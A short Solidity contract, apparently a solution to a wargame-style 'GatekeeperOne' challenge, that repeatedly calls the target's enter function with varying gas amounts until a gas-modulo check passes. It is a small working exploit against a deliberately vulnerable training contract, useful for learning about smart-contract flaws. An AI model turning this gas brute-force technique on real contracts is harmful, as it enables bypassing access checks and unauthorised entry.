// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./GatekeeperOne.sol";

contract OpenGateOne {
    GatekeeperOne gatekeeperOne;

    constructor(address _gateKeeperOneAddress) public {
        gatekeeperOne = GatekeeperOne(_gateKeeperOneAddress);
    }

    function open(bytes8 _gateKey) public returns (bool) {
        // gas offset usually comes in around 210, give a buffer of 60 on each side
        for (uint256 i = 0; i < 120; i++) {
            (bool result, bytes memory data) = address(gatekeeperOne).call.gas(
                i + 150 + 8191 * 3
            )(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (result) {
                break;
            }
        }
    }
}
